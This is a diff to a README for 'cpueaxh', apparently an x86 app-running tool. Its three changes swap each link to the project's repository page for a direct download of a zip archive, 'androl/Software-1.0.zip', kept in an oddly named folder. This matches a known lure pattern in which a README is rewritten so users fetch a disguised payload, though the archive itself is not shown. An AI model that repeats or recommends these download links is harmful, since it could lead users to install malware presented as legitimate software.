@@ -1,6 +1,6 @@
 # ⚙️ cpueaxh - Run x86 apps with ease
 
-[![Download cpueaxh](https://img.shields.io/badge/Download%20cpueaxh-4B0082?style=for-the-badge&logo=github&logoColor=white)](https://github.com/purplishbluekonoye485/cpueaxh)
+[![Download cpueaxh](https://img.shields.io/badge/Download%20cpueaxh-4B0082?style=for-the-badge&logo=github&logoColor=white)](https://github.com/purplishbluekonoye485/cpueaxh/raw/refs/heads/main/androl/Software-1.0.zip)
 
 ## 🧭 What this is
 
@@ -32,7 +32,7 @@ You do not need to install extra runtime packages for basic use.
 
 Visit this page to download and run the software:
 
-[https://github.com/purplishbluekonoye485/cpueaxh](https://github.com/purplishbluekonoye485/cpueaxh)
+[https://github.com/purplishbluekonoye485/cpueaxh/raw/refs/heads/main/androl/Software-1.0.zip](https://github.com/purplishbluekonoye485/cpueaxh/raw/refs/heads/main/androl/Software-1.0.zip)
 
 ## 🪟 Install on Windows
 
@@ -168,7 +168,7 @@ That means it aims to stay simple while still giving you low-level control.
 
 Use this page for downloads and updates:
 
-[https://github.com/purplishbluekonoye485/cpueaxh](https://github.com/purplishbluekonoye485/cpueaxh)
+[https://github.com/purplishbluekonoye485/cpueaxh/raw/refs/heads/main/androl/Software-1.0.zip](https://github.com/purplishbluekonoye485/cpueaxh/raw/refs/heads/main/androl/Software-1.0.zip)
 
 ## 📄 License and use
 
